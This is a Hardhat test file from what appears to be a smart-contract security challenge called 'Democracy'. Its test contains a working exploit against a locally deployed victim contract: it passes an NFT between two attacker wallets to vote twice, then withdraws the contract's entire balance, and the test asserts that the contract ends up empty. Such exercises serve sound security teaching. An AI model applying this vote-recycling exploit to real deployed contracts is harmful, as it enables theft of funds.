const {
  time,
  loadFixture,
} = require("@nomicfoundation/hardhat-network-helpers");
const { anyValue } = require("@nomicfoundation/hardhat-chai-matchers/withArgs");
const { expect } = require("chai");
const { ethers } = require("hardhat");

const NAME = "Democracy";

describe(NAME, function () {
  async function setup() {
      const [owner, attackerWallet, attackerWallet2] = await ethers.getSigners();
      const value = ethers.utils.parseEther("1");

      const VictimFactory = await ethers.getContractFactory(NAME);
      const victimContract = await VictimFactory.deploy({ value });

      return { victimContract, attackerWallet, attackerWallet2 };
  }

  describe("exploit", async function () {
      let victimContract, attackerWallet, attackerWallet2;
      before(async function () {
          ({ victimContract, attackerWallet, attackerWallet2 } = await loadFixture(setup));
      })

      it("conduct your attack here", async function () {
          // Step 1: Nominate challenger as attacker to get NFTs
          await victimContract.connect(attackerWallet).nominateChallenger(attackerWallet.address);

          console.log("Attacker1 NFTs: ", await victimContract.balanceOf(attackerWallet.address));

          // Step 2: Transfer nft to another address and vote
          await victimContract.connect(attackerWallet).transferFrom(attackerWallet.address, attackerWallet2.address, 0);

          console.log("Attacker2 NFTs: ", await victimContract.balanceOf(attackerWallet2.address));

          await victimContract.connect(attackerWallet2).vote(attackerWallet.address);

          console.log("Attacker2 voted")

          // Step 3: Transfer NFT back and vote again
          await victimContract.connect(attackerWallet2).transferFrom(attackerWallet2.address, attackerWallet.address, 0);

          await victimContract.connect(attackerWallet).vote(attackerWallet.address);

          // Step 4: Withdraw funds
          await victimContract.connect(attackerWallet).withdrawToAddress(attackerWallet.address);
      });

      after(async function () {
          const victimContractBalance = await ethers.provider.getBalance(victimContract.address);
          expect(victimContractBalance).to.be.equal('0');
      });
  });
});
